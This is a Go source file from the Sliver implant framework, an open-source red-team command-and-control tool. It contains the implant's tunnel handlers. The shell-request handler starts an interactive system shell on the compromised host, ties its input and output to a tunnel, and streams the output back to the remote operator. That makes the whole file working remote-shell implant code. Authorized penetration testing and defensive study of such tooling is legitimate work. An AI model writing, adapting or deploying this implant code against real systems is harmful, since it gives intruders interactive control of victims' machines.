package handlers

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"io"

	// {{if .Debug}}
	"log"
	// {{end}}

	pb "github.com/bishopfox/sliver/protobuf/sliver"
	"github.com/bishopfox/sliver/sliver/shell"
	"github.com/bishopfox/sliver/sliver/transports"

	"github.com/golang/protobuf/proto"
)

const (
	readBufSize = 1024
)

var (
	tunnelHandlers = map[uint32]TunnelHandler{
		pb.MsgShellReq: shellReqHandler,

		pb.MsgTunnelData:  tunnelDataHandler,
		pb.MsgTunnelClose: tunnelCloseHandler,
	}
)

// GetTunnelHandlers - Returns a map of tunnel handlers
func GetTunnelHandlers() map[uint32]TunnelHandler {
	return tunnelHandlers
}

func tunnelCloseHandler(envelope *pb.Envelope, connection *transports.Connection) {
	tunnelClose := &pb.TunnelClose{}
	proto.Unmarshal(envelope.Data, tunnelClose)
	tunnel := connection.Tunnel(tunnelClose.TunnelID)
	if tunnel != nil {
		// {{if .Debug}}
		log.Printf("[tunnel] Closing tunnel with id %d", tunnel.ID)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnel.Reader.Close()
		tunnel.Writer.Close()
	}
}

func tunnelDataHandler(envelope *pb.Envelope, connection *transports.Connection) {
	tunData := &pb.TunnelData{}
	proto.Unmarshal(envelope.Data, tunData)
	tunnel := connection.Tunnel(tunData.TunnelID)
	if tunnel != nil {
		// {{if .Debug}}
		log.Printf("[tunnel] Write %d bytes to tunnel %d", len(tunData.Data), tunnel.ID)
		// {{end}}
		tunnel.Writer.Write(tunData.Data)
	} else {
		// {{if .Debug}}
		log.Printf("Data for nil tunnel %d", tunData.TunnelID)
		// {{end}}
	}
}

func shellReqHandler(envelope *pb.Envelope, connection *transports.Connection) {

	shellReq := &pb.ShellReq{}
	err := proto.Unmarshal(envelope.Data, shellReq)
	if err != nil {
		return
	}

	shellPath := shell.GetSystemShellPath(shellReq.Path)
	systemShell := shell.StartInteractive(shellReq.TunnelID, shellPath, shellReq.EnablePTY)
	tunnel := &transports.Tunnel{
		ID:     shellReq.TunnelID,
		Reader: systemShell.Stdout,
		Writer: systemShell.Stdin,
	}
	connection.AddTunnel(tunnel)

	shellResp, _ := proto.Marshal(&pb.Shell{
		Success: true,
		Pid:     uint32(systemShell.Command.Process.Pid),
	})
	connection.Send <- &pb.Envelope{
		ID:   envelope.ID,
		Data: shellResp,
	}

	// Cleanup function with arguments
	cleanup := func(reason string) {
		// {{if .Debug}}
		log.Printf("Closing tunnel %d", tunnel.ID)
		// {{end}}
		connection.RemoveTunnel(tunnel.ID)
		tunnelClose, _ := proto.Marshal(&pb.TunnelClose{
			TunnelID: tunnel.ID,
			Err:      reason,
		})
		connection.Send <- &pb.Envelope{
			Type: pb.MsgTunnelClose,
			Data: tunnelClose,
		}
	}

	go func() {
		for {
			readBuf := make([]byte, readBufSize)
			n, err := tunnel.Reader.Read(readBuf)
			if err == io.EOF {
				// {{if .Debug}}
				log.Printf("Read EOF on tunnel %d", tunnel.ID)
				// {{end}}
				defer cleanup("EOF")
				return
			}
			// {{if .Debug}}
			log.Printf("[shell] stdout %d bytes on tunnel %d", n, tunnel.ID)
			log.Printf("[shell] %#v", string(readBuf[:n]))
			// {{end}}
			data, err := proto.Marshal(&pb.TunnelData{
				TunnelID: tunnel.ID,
				Data:     readBuf[:n],
			})
			connection.Send <- &pb.Envelope{
				Type: pb.MsgTunnelData,
				Data: data,
			}
		}
	}()

	// {{if .Debug}}
	log.Printf("Started shell with tunnel ID %d", tunnel.ID)
	// {{end}}

}
